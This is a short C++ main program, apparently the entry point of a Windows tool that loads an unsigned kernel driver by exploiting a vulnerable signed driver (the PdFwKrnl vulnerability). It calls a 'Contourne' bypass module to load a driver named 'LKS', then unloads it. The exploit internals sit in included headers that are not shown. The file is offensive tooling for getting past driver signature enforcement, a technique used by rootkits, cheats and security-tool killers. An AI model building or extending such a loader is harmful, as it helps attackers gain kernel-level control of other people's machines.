#include <iostream>
#include <windows.h>
#include "Load.h"
#include "Contourne.h"
#include "driver_data.h"

int main()
{
    std::cout << " Initializing ...\n";
    if (!Contourne::init())
    {
        std::cerr << "[ERROR] Initialization failed. Exiting.\n";
        return 1;
    }

    Sleep(3000);

    std::cout << "Initializing exploit and loading driver using PdFwKrnl vulnerability...\n";

    Contourne::Status status = Contourne::load_driver("LKS","VuldKrnl");

    std::cout << " Status: " << Contourne::status_to_string(status) << std::endl;

    Sleep(3000);
    if (driver::unload("LKS"))
    {
        std::cout << "[INFO] Driver Unloaded!\n";
    }
    else
    {
        std::cerr << "[ERROR] Failed to unload driver!\n";
    }

    Sleep(10000);

    return 0;
}